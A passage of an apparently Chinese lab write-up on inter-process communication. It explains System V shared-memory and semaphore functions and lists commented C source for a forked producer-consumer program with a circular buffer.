class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_rand_num</span><span class="hljs-params">()</span> <span class="hljs-comment">//0~99 随机数</span><br><span class="hljs-type">char</span> <span class="hljs-title function_">get_rand_letter</span><span class="hljs-params">()</span> <span class="hljs-comment">//随机生成A~Z</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Wait</span><span class="hljs-params">(<span class="hljs-type">int</span> sem_id)</span> <span class="hljs-comment">//P操作</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Signal</span><span class="hljs-params">(<span class="hljs-type">int</span> sem_id)</span> <span class="hljs-comment">//V操作</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printTime</span><span class="hljs-params">()</span> <span class="hljs-comment">//输出时间</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Producer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *bf)</span> <span class="hljs-comment">//生产者操作</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Consumer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *bf)</span> <span class="hljs-comment">//消费者操作</span><br></code></pre></div></td></tr></table></figure></li></ol><ol><li><p><strong>各类库中的关键函数</strong></p><ul><li><p><code>&lt;sys/shm.h&gt;</code>中：</p><ul><li><p><code>shmget()</code>函数：用来创建共享内存。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">shmget</span><span class="hljs-params">(<span class="hljs-type">key_t</span> key, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> shmflg)</span>;<br></code></pre></div></td></tr></table></figure><ul><li>第一个参数：键值key有效地为共享内存段命名。</li><li>第二个参数：size以字节为单位指定需要共享的内存容量。</li><li>第三个参数：shmflg是权限标志，如果要想在key标识的共享内存不存在时创建，需要与IPC_CREAT做或操作。如0644,它表示允许一个进程创建的共享内存被内存创建者所拥有的进程向共享内存读取和写入数据，同时其他用户创建的进程只能读取共享内存。</li><li>调用成功时返回一个与key相关的共享内存标识符（非负整数），用于后续的共享内存函数。调用失败返回-1.</li></ul></li><li><p><code>shmat()</code>函数：启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">shmat</span><span class="hljs-params">(<span class="hljs-type">int</span> shm_id, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *shm_addr, <span class="hljs-type">int</span> shmflg)</span>;<br></code></pre></div></td></tr></table></figure><ul><li>第一个参数：shm_id是由shmget()函数返回的共享内存标识。</li><li>第二个参数：shm_addr指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址。</li><li>第三个参数：shm_flg是一组标志位，通常为0。</li><li>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1。</li></ul></li><li><p><code>shmdt()</code>函数：用于将共享内存从当前进程中分离。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">shmdt</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *shmaddr)</span>;<br></code></pre></div></td></tr></table></figure><ul><li>参数：shmaddr是shmat()函数返回的地址指针。</li><li>调用成功时返回0，失败时返回-1。</li></ul></li><li><p><code>shmctl()</code>函数：用来控制共享内存。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">shmctl</span><span class="hljs-params">(<span class="hljs-type">int</span> shm_id, <span class="hljs-type">int</span> command, <span class="hljs-keyword">struct</span> shmid_ds *buf)</span>;<br></code></pre></div></td></tr></table></figure><ul><li>第一个参数：shm_id是shmget()函数返回的共享内存标识符。</li><li>第二个参数：command是要采取的操作，它可以取下面的三个值:<ul><li>IPC_STAT：把shmid_ds结构中的数据设置为共享内存的当前关联值，即用共享内存的当前关联值覆盖shmid_ds的值；</li><li>IPC_SET：如果进程有足够的权限，就把共享内存的当前关联值设置为shmid_ds结构中给出的值；</li><li>IPC_RMID：删除共享内存段。</li></ul></li><li>第三个参数：buf是一个结构指针，它指向共享内存模式和访问权限的结构。</li><li>调用成功时返回0，失败时返回-1。</li></ul></li></ul></li><li><p><code>&lt;sys/sem.h&gt;</code>中：</p><ul><li><p><code>semget()</code>函数：创建一个新的信号量集</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">semget</span><span class="hljs-params">(<span class="hljs-type">key_t</span> key,<span class="hljs-type">int</span> nsems,<span class="hljs-type">int</span> semflg)</span>;<br></code></pre></div></td></tr></table></figure><ul><li>第一个参数：键值key有效地为信号量（集）命名。</li><li>第二个参数：一个新的信号量集中应该创建的信号量的个数。单个信号量则为1。</li><li>第三个参数：权限位，如果要想在key标识的信号量不存在时创建，需要与IPC_CREAT做或操作。</li><li>调用成功则返回信号量集的IPC标识符，失败则返回-1。</li></ul></li><li><p><code>semctl()</code>函数：用来控制信号量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">semctl</span><span class="hljs-params">(<span class="hljs-type">int</span> semid,<span class="hljs-type">int</span> semnum,<span class="hljs-type">int</span> cmd,<span class="hljs-keyword">union</span> semun arg)</span>;<br></code></pre></div></td></tr></table></figure><ul><li><p>第一个参数：sem_id是semget()函数返回的信号量标识符。</p></li><li><p>第二个参数：semnum是信号量编号，当要用到信号量集时才用到。单个信号量则为0。</p></li><li><p>第三个参数：cmd是要采取的操作，它可以取下面的几个值:</p><ul><li><p>IPC_STAT（或STAT）：获得该信号量（或信号量集）的semid_ds结构（描述信号量的结构），并存放在第四个参数arg结构变量的buf域指向的semid_ds结构中。</p></li><li><p>IPC_SETVAL（或SETVAL）：将信号量值设置为arg的值。</p></li><li><p>IPC_GETVAL （或GETVAL）：返回信号量的当前值。</p></li><li><p>IPC_RMID：删除信号量。</p></li></ul></li><li><p>调用成功时根据cmd值的不同返回不同值，失败时返回-1。</p></li></ul></li><li><p><code>semop()</code>函数：对信号量进行操作</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">semop</span><span class="hljs-params">(<span class="hljs-type">int</span> semid,<span class="hljs-keyword">struct</span> sembuf*sops,<span class="hljs-type">size_t</span> nsops )</span>;<br></code></pre></div></td></tr></table></figure><ul><li><p>第一个参数：sem_id是semget()函数返回的信号量标识符。</p></li><li><p>第二个参数：sops指向信号量操作结构体。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> sem_num;    <span class="hljs-comment">//信号量编号</span><br>    <span class="hljs-type">short</span> <span class="hljs-type">int</span> sem_op;              <span class="hljs-comment">//对信号量的操作(-1:P +1:V)</span><br>    <span class="hljs-type">short</span> <span class="hljs-type">int</span> sem_flg;             <span class="hljs-comment">//通常设为SEM_UNDO</span><br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul></li></ul></li></ul></li></ol><div class="hljs code-wrapper"><pre><code class="hljs">   - 第三个参数：nsop是sops中的操作个数，通常为1，代表单个操作。   - 调用成功时返回信号量标识符，失败时返回-1。</code></pre></div><h2 id="源程序并附上注释"><a href="#源程序并附上注释" class="headerlink" title="源程序并附上注释"></a>源程序并附上注释</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">//缓冲区大小</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_BUFFER_SIZE 10</span><br><span class="hljs-comment">//共享内存和信号量：当前用户的进程可读写</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_MODE 0600</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEM_MODE 0600</span><br><br><span class="hljs-comment">//信号量的键值</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEM_FULL 1     <span class="hljs-comment">//信号量 1 --- full</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEM_EMPTY 2    <span class="hljs-comment">//信号量 2 --- empty </span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MUTEX 3        <span class="hljs-comment">//信号量 3 --- 互斥量</span></span><br><span class="hljs-comment">//共享内存的键值</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SHMKEY 75</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> //循环队列</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> in; <span class="hljs-comment">//指向缓冲中下一个空位</span><br><span class="hljs-type">int</span> out; <span class="hljs-comment">//指向缓冲中第一个满位</span><br><span class="hljs-type">char</span> str[MAX_BUFFER_SIZE]; <span class="hljs-comment">//存放字母</span><br><span class="hljs-type">int</span> num; <span class="hljs-comment">//产品个数</span><br><span class="hljs-type">int</span> is_empty; <span class="hljs-comment">//是否为空</span><br>&#125;;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Consumer = <span class="hljs-number">2</span>; <span class="hljs-comment">//消费者数量</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Producer = <span class="hljs-number">2</span>; <span class="hljs-comment">//生产者数量</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Buffer = <span class="hljs-number">10</span>; <span class="hljs-comment">//缓冲区大小</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Worktime = <span class="hljs-number">10</span>; <span class="hljs-comment">//每个进程执行的次数</span><br><span class="hljs-type">int</span> shm_id; <span class="hljs-comment">//shmget函数返回的共享内存标识符</span><br><span class="hljs-type">int</span> full, empty, mutex; <span class="hljs-comment">//semget函数返回的信号量标识符</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">start</span>;</span> <span class="hljs-comment">//开始时间</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">now</span>;</span> <span class="hljs-comment">//当前时间</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_rand_num</span><span class="hljs-params">()</span> <span class="hljs-comment">//0~99 随机数</span><br>&#123;<br>gettimeofday(&amp;now, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">int</span> digit;<br>srand((<span class="hljs-type">unsigned</span>)(now.tv_usec)); <span class="hljs-comment">//当前时间（微秒）作为随机数种子</span><br>digit = rand() % <span class="hljs-number">100</span>;<br><span class="hljs-keyword">return</span> digit;<br>&#125;<br><br><span class="hljs-type">char</span> <span class="hljs-title function_">get_rand_letter</span><span class="hljs-params">()</span> <span class="hljs-comment">//随机生成A~Z</span><br>&#123;<br>gettimeofday(&amp;now, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">char</span> letter;<br>srand((<span class="hljs-type">unsigned</span>)(now.tv_usec));<br>letter = (<span class="hljs-type">char</span>)((rand() % <span class="hljs-number">26</span>) + <span class="hljs-string">&#x27;A&#x27;</span>);<br><span class="hljs-keyword">return</span> letter;<br>&#125;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">//信号量操作结构体(在sys/sem.h中定义)</span><br><span class="hljs-comment">struct sembuf</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    unsigned short int sem_num;    //信号量编号</span><br><span class="hljs-comment">    short int sem_op;              //对信号量的操作</span><br><span class="hljs-comment">    short int sem_flg;             //通常设为SEM_UNDO</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Wait</span><span class="hljs-params">(<span class="hljs-type">int</span> sem_id)</span> <span class="hljs-comment">//P操作</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sb</span>;</span><br>sb.sem_num = <span class="hljs-number">0</span>;<br>sb.sem_op = <span class="hljs-number">-1</span>; <span class="hljs-comment">//Wait(-1)</span><br>sb.sem_flg = SEM_UNDO;<br><span class="hljs-keyword">if</span> (semop(sem_id, &amp;sb, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//P操作，判断是否成功</span><br>&#123;<br>perror(<span class="hljs-string">&quot;P操作失败！\n&quot;</span>); <span class="hljs-comment">//输出错误信息</span><br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Signal</span><span class="hljs-params">(<span class="hljs-type">int</span> sem_id)</span> <span class="hljs-comment">//V操作</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sb</span>;</span><br>sb.sem_num = <span class="hljs-number">0</span>;<br>sb.sem_op = <span class="hljs-number">1</span>; <span class="hljs-comment">//Signal(+1)</span><br>sb.sem_flg = SEM_UNDO;<br><span class="hljs-keyword">if</span> (semop(sem_id, &amp;sb, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//V操作，判断是否成功</span><br>&#123;<br>perror(<span class="hljs-string">&quot;V操作失败！\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">printTime</span><span class="hljs-params">()</span> <span class="hljs-comment">//输出时间</span><br>&#123;<br>gettimeofday(&amp;now, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">double</span> difference = ((<span class="hljs-type">double</span>)now.tv_usec - (<span class="hljs-type">double</span>)start.tv_usec) / <span class="hljs-number">1000000</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| %8.4fs    | &quot;</span>, difference);<br>&#125;<br><br><span class="hljs-comment">//生产者操作</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Producer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *bf)</span><br>&#123;<br><span class="hljs-type">int</span> i, j;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_Producer; i++) <span class="hljs-comment">//使用循环创建进程</span><br>&#123;<br><span class="hljs-type">int</span> pid = fork(); <span class="hljs-comment">//创建子进程</span><br><span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建进程失败\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-type">void</span> *addr;<br>addr = shmat(shm_id, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>bf = (<span class="hljs-keyword">struct</span> buf *) addr;<br><span class="hljs-keyword">if</span> (bf == (<span class="hljs-type">void</span> *) - <span class="hljs-number">1</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;连接共享内存失败！\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; N_Worktime; j++) <span class="hljs-comment">//每个进程操作10次</span><br>&#123;<br>Wait(empty);<br>Wait(mutex);<br><span class="hljs-comment">//随机等待一段时间(0~99微秒)</span><br>usleep(get_rand_num());<br><span class="hljs-comment">//向缓冲区添加数据</span><br><span class="hljs-type">char</span> c = get_rand_letter();<br>bf-&gt;str[bf-&gt;in] = c;<br>bf-&gt;in = (bf-&gt;in + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>bf-&gt;is_empty = <span class="hljs-number">0</span>;<br>bf-&gt;num++;<br><span class="hljs-type">int</span> first, last;<br><span class="hljs-comment">//打印时间</span><br>printTime();<br><span class="hljs-comment">//打印缓冲区数据</span><br><span class="hljs-keyword">if</span> (bf-&gt;in - <span class="hljs-number">1</span> &gt;= bf-&gt;out)<br>last = bf-&gt;in - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>last = bf-&gt;in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE;<br><span class="hljs-keyword">for</span> (first = bf-&gt;out; bf-&gt;num&gt;<span class="hljs-number">0</span>&amp;&amp;first &lt;= last; first++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, bf-&gt;str[first % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-type">int</span> k;<br><span class="hljs-keyword">for</span> (k = bf-&gt;num; k &lt;= MAX_BUFFER_SIZE; k++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  &quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-comment">//打印进程编号和产生数据</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   生产者进程%d  |      生产%c       |\n&quot;</span>, i, c);<br><span class="hljs-comment">//刷新缓冲区</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br>Signal(mutex);<br>Signal(full);<br>&#125;<br><span class="hljs-comment">//取消对共享内存段的连接</span><br>shmdt(addr);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//消费者操作</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Consumer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *bf)</span><br>&#123;<br><span class="hljs-type">int</span> i, j;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_Producer; i++) <span class="hljs-comment">//使用循环创建进程</span><br>&#123;<br><span class="hljs-type">int</span> pid = fork(); <span class="hljs-comment">//创建子进程</span><br><span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建进程失败\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-type">void</span> *addr;<br>addr = shmat(shm_id, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>bf = (<span class="hljs-keyword">struct</span> buf *) addr;<br><span class="hljs-keyword">if</span> (bf == (<span class="hljs-type">void</span> *) - <span class="hljs-number">1</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;连接共享内存失败！\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; N_Worktime; j++) <span class="hljs-comment">//每个进程操作10次</span><br>&#123;<br>Wait(full);<br>Wait(mutex);<br><span class="hljs-comment">//随机等待一段时间(0~99微秒)</span><br>usleep(get_rand_num());<br><span class="hljs-comment">//从缓冲区取走数据</span><br><span class="hljs-type">char</span> c = bf-&gt;str[bf-&gt;out];<br>bf-&gt;out = (bf-&gt;out + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>bf-&gt;is_empty = (bf-&gt;out == bf-&gt;in);<br>bf-&gt;num--;<br><span class="hljs-type">int</span> first, last;<br><span class="hljs-comment">//打印时间</span><br>printTime();<br><span class="hljs-comment">//打印缓冲区数据</span><br><span class="hljs-keyword">if</span> (bf-&gt;in - <span class="hljs-number">1</span> &gt;= bf-&gt;out)<br>last = bf-&gt;in - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>last = bf-&gt;in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE;<br><span class="hljs-keyword">for</span> (first = bf-&gt;out; bf-&gt;num&gt;<span class="hljs-number">0</span>&amp;&amp;first &lt;= last; first++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, bf-&gt;str[first % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-type">int</span> k;<br><span class="hljs-keyword">for</span> (k = bf-&gt;num; k &lt;= 